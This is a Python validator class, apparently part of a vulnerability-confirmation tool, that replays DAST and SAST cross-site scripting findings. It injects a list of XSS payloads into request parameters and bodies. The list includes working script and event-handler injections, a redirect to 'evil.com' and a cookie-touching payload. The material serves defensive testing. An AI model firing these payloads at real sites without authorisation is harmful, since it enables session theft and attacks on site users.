"""
Validator for Cross-Site Scripting (XSS) vulnerabilities.
"""
import logging
import json
import uuid
import re
import urllib.parse
import tempfile
import os
from typing import List, Dict, Any, Optional

from api.core.validator import Validator, ValidationResult
from api.models.finding import Finding
from api.models.vxdf import EvidenceTypeEnum
from api.utils.docker_utils import DockerEnvironment
from api.utils.http_utils import (
    make_request, inject_payload_in_params, 
    inject_payload_in_body, detect_xss_success,
    format_request_response
)

logger = logging.getLogger(__name__)

class XSSValidator(Validator):
    """
    Validator for Cross-Site Scripting (XSS) vulnerabilities.
    """
    
    def __init__(self):
        """
        Initialize the XSS validator.
        """
        super().__init__()
        self.name = "XSS Validator"
        self.payloads = [
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<input type=button onclick=alert(1) value=Click>",
            "';alert(1);//",
            "\";alert(1);//",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            "'\"><script>alert(1)</script>",
            "javascript:void(alert(1))",
            "<script>location='http://evil.com'</script>",
            "<script>document.cookie='stolen='+document.cookie</script>"
        ]
        self.docker_env = None
    
    def validate(self, finding: Finding) -> ValidationResult:
        """
        Validate XSS vulnerability.
        
        Args:
            finding: The finding to validate
            
        Returns:
            ValidationResult with details of validation
        """
        logger.info(f"Validating XSS vulnerability: {finding.id}")
        
        # Strategy depends on finding type (SAST, DAST, etc.)
        if finding.source_type == "DAST-ZAP" or finding.source_type == "DAST-Burp" or finding.source_type == "DAST-Generic":
            return self._validate_dast_finding(finding)
        else:
            # Default to SAST validation
            return self._validate_sast_finding(finding)
    
    def _validate_dast_finding(self, finding: Finding) -> ValidationResult:
        """
        Validate XSS from DAST findings by replaying requests.
        
        Args:
            finding: The finding to validate
            
        Returns:
            ValidationResult with details of validation
        """
        # Extract URL and request/response details
        url = None
        request_method = "GET"
        request_data = None
        request_headers = {}
        request_cookies = {}
        
        # Get URL and request details from raw_data
        if finding.raw_data:
            if 'url' in finding.raw_data:
                url = finding.raw_data['url']
            
            # Try to parse request
            if 'request' in finding.raw_data and finding.raw_data['request']:
                request_lines = finding.raw_data['request'].splitlines()
                if request_lines:
                    # First line might contain method and URL
                    first_line = request_lines[0]
                    match = re.match(r'^(GET|POST|PUT|DELETE)\s+(\S+)', first_line)
                    if match:
                        request_method = match.group(1)
                        if not url:
                            url = match.group(2)
                    
                    # Parse headers
                    for line in request_lines[1:]:
                        if not line.strip():
                            break
                        
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            header_name = parts[0].strip()
                            header_value = parts[1].strip()
                            
                            if header_name.lower() == 'cookie':
                                # Parse cookies
                                for cookie in header_value.split(';'):
                                    if '=' in cookie:
                                        cookie_name, cookie_value = cookie.split('=', 1)
                                        request_cookies[cookie_name.strip()] = cookie_value.strip()
                            else:
                                request_headers[header_name] = header_value
                    
                    # Extract request body
                    if request_method in ['POST', 'PUT']:
                        body_start = None
                        for i, line in enumerate(request_lines):
                            if not line.strip():
                                body_start = i + 1
                                break
                        
                        if body_start and body_start < len(request_lines):
                            request_data = '\n'.join(request_lines[body_start:])
        
        # If no URL found, we can't validate
        if not url:
            return ValidationResult(
                is_exploitable=False,
                message="Could not extract URL from finding to validate XSS"
            )
        
        # Try each payload
        evidence = []
        successful_payloads = []
        
        for payload in self.payloads:
            # For GET requests, inject into URL parameters
            if request_method == "GET":
                test_url = inject_payload_in_params(url, payload)
                
                try:
                    response = make_request(
                        test_url,
                        method=request_method,
                        headers=request_headers,
                        cookies=request_cookies,
                        timeout=10
                    )
                    
                    # Check for XSS success in response
                    if detect_xss_success(response, payload):
                        successful_payloads.append(payload)
                        
                        # Create evidence
                        evidence_item = {
                            "type": EvidenceTypeEnum.HTTP_REQUEST_LOG.value,
                            "description": f"XSS with payload: {payload}",
                            "content": format_request_response(response.request, response)
                        }
                        evidence.append(evidence_item)
                
                except Exception as e:
                    logger.warning(f"Error testing XSS payload: {e}")
                    continue
            
            # For POST requests, inject into body
            else:
                if not request_data:
                    continue
                
                # Try to inject into form data or JSON
                test_data = inject_payload_in_body(request_data, payload)
                
                try:
                    response = make_request(
                        url,
                        method=request_method,
                        data=test_data,
                        headers=request_headers,
                        cookies=request_cookies,
                        timeout=10
                    )
                    
                    # Check for XSS success in response
                    if detect_xss_success(response, payload):
                        successful_payloads.append(payload)
                        
                        # Create evidence
                        evidence_item = {
                            "type": EvidenceTypeEnum.HTTP_REQUEST_LOG.value,
                            "description": f"XSS with payload: {payload}",
                            "content": format_request_response(response.request, response)
                        }
                        evidence.append(evidence_item)
                
                except Exception as e:
                    logger.warning(f"Error testing XSS payload: {e}")
                    continue
        
        # Determine if exploitable
        is_exploitable = len(successful_payloads) > 0
        
        if is_exploitable:
            message = f"Confirmed XSS vulnerability. {len(successful_payloads)} payloads successfully reflected: {', '.join(successful_payloads[:3])}"
        else:
            message = "Could not confirm XSS vulnerability. No test payloads were reflected in the response."
        
        return ValidationResult(
            is_exploitable=is_exploitable,
            message=message,
            evidence=evidence
        )
    
    def _validate_sast_finding(self, finding: Finding) -> ValidationResult:
        """
        Validate XSS from SAST findings using Docker.
        
        Args:
            finding: The finding to validate
            
        Returns:
            ValidationResult with details of validation
        """
        # First check if we have file path and code to analyze
        if not finding.file_path:
            return ValidationResult(
                is_exploitable=False,
                message="No file path available in finding to validate XSS"
            )
        
        # Set up a Docker environment to validate the XSS
        try:
            self.docker_env = DockerEnvironment()
            if not self.docker_env.setup():
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to set up Docker environment for validation"
                )
            
            self.docker_env.create_container(name_prefix="xss_validator_")
            
            # Install necessary packages
            self.docker_env.install_package("python3 python3-pip")
            self.docker_env.execute_command("pip3 install beautifulsoup4 html5lib")
            
            # Create a test script based on the finding
            script_path = self._create_test_script(finding)
            
            if not script_path:
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to create test script for XSS validation"
                )
            
            # Copy the script to the container
            if not self.docker_env.copy_to_container(script_path, "/tmp/test_xss.py"):
                return ValidationResult(
                    is_exploitable=False,
                    message="Failed to copy test script to Docker container"
                )
            
            # Execute the test script
            exit_code, stdout, stderr = self.docker_env.execute_command("python3 /tmp/test_xss.py")
            
            # Parse the results
            if exit_code != 0:
                return ValidationResult(
                    is_exploitable=False,
                    message=f"Error executing test script: {stderr}"
                )
            
            try:
                result = json.loads(stdout)
                is_exploitable = result.get("is_exploitable", False)
                successful_payloads = result.get("successful_payloads", [])
                
                evidence = []
                for payload_result in result.get("tests", []):
                    evidence_item = {
                        "type": EvidenceTypeEnum.TEST_PAYLOAD_USED.value,
                        "description": f"XSS test with payload: {payload_result['payload']}",
                        "content": json.dumps(payload_result, indent=2)
                    }
                    evidence.append(evidence_item)
                
                if is_exploitable:
                    message = f"Confirmed XSS vulnerability. {len(successful_payloads)} payloads were successful: {', '.join(successful_payloads[:3])}"
                else:
                    message = "Could not confirm XSS vulnerability. No test payloads were successful."
                
                return ValidationResult(
                    is_exploitable=is_exploitable,
                    message=message,
                    evidence=evidence
                )
            
            except json.JSONDecodeError:
                return ValidationResult(
                    is_exploitable=False,
                    message=f"Error parsing test results: {stdout}"
                )
            
        finally:
            # Clean up
            if self.docker_env:
                self.docker_env.cleanup()
                self.docker_env = None
    
    def _create_test_script(self, finding: Finding) -> Optional[str]:
        """
        Create a Python script to test for XSS.
        
        Args:
            finding: The finding to validate
            
        Returns:
            Path to the created script, or None if failed
        """
        try:
            # Create a temporary file
            fd, path = tempfile.mkstemp(suffix=".py", prefix="xss_test_")
            
            # Generate test code
            code = """
import requests
import json
import re
from bs4 import BeautifulSoup

# Test server
SERVER_URL = "http://localhost:8080"

# Payloads to test
PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<div style=\\"background-image: url(javascript:alert(1))\\">",
    "<iframe src=\\"javascript:alert(1)\\"></iframe>",
    "<input type=\\"text\\" onfocus=\\"alert(1)\\" autofocus>",
    "<a href=\\"javascript:alert(1)\\">Click me</a>",
    "'-alert(1)-'",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>"
]

def detect_xss_reflection(response_text, payload):
    '''Detect if a payload is reflected in the response.'''
    # Check in raw response
    if payload in response_text:
        return True
    
    # Parse HTML with BeautifulSoup
    soup = BeautifulSoup(response_text, 'html.parser')
    
    # Check for script tags
    for script in soup.find_all('script'):
        if script.string and payload in script.string:
            return True
    
    # Check for event handlers
    for tag in soup.find_all(True):
        for attr in tag.attrs:
            if isinstance(tag.attrs[attr], str) and attr.startswith('on') and payload in tag.attrs[attr]:
                return True
    
    # Check for payload in attributes
    for tag in soup.find_all(True):
        for attr, value in tag.attrs.items():
            if isinstance(value, str) and payload in value:
                return True
    
    return False

def test_xss():
    '''Test XSS payloads.'''
    results = {
        "is_exploitable": False,
        "successful_payloads": [],
        "tests": []
    }
    
    # Endpoints to test
    endpoints = [
        # Vulnerable endpoint (GET)
        {"url": SERVER_URL + "/echo", "method": "GET", "param": "input"},
        # Vulnerable endpoint (POST)
        {"url": SERVER_URL + "/echo_post", "method": "POST", "param": "input"},
        # Safe endpoint
        {"url": SERVER_URL + "/safe", "method": "GET", "param": "input"}
    ]
    
    for endpoint in endpoints:
        url = endpoint["url"]
        method = endpoint["method"]
        param = endpoint["param"]
        
        # First test with safe value
        safe_value = "Hello World"
        safe_params = {param: safe_value} if method == "GET" else None
        safe_data = {param: safe_value} if method == "POST" else None
        
        try:
            safe_response = requests.request(method, url, params=safe_params, data=safe_data, timeout=5)
            safe_reflected = safe_value in safe_response.text
            
            safe_test = {
                "endpoint": url,
                "method": method,
                "parameter": param,
                "payload": safe_value,
                "reflected": safe_reflected,
                "status_code": safe_response.status_code
            }
            
            results["tests"].append(safe_test)
            
            # Now test with XSS payloads
            for payload in PAYLOADS:
                xss_params = {param: payload} if method == "GET" else None
                xss_data = {param: payload} if method == "POST" else None
                
                try:
                    xss_response = requests.request(method, url, params=xss_params, data=xss_data, timeout=5)
                    is_reflected = detect_xss_reflection(xss_response.text, payload)
                    
                    test_result = {
                        "endpoint": url,
                        "method": method,
                        "parameter": param,
                        "payload": payload,
                        "reflected": is_reflected,
                        "status_code": xss_response.status_code
                    }
                    
                    results["tests"].append(test_result)
                    
                    # If reflected, mark as exploitable
                    if is_reflected and not url.endswith("/safe"):  # Exclude the safe endpoint
                        results["is_exploitable"] = True
                        results["successful_payloads"].append(payload)
                
                except Exception as e:
                    test_result = {
                        "endpoint": url,
                        "method": method,
                        "parameter": param,
                        "payload": payload,
                        "error": str(e)
                    }
                    results["tests"].append(test_result)
        
        except Exception as e:
            endpoint_result = {
                "endpoint": url,
                "method": method,
                "error": str(e)
            }
            results["tests"].append(endpoint_result)
    
    # Remove duplicates from successful payloads
    results["successful_payloads"] = list(set(results["successful_payloads"]))
    
    return results

if __name__ == "__main__":
    results = test_xss()
    print(json.dumps(results, indent=2))
"""
            
            # Write the code to the file
            with os.fdopen(fd, 'w') as f:
                f.write(code)
            
            return path
        
        except Exception as e:
            logger.error(f"Error creating test script: {e}", exc_info=True)
            return None
    
    def cleanup(self) -> None:
        """
        Clean up resources.
        """
        if self.docker_env:
            self.docker_env.cleanup()
            self.docker_env = None
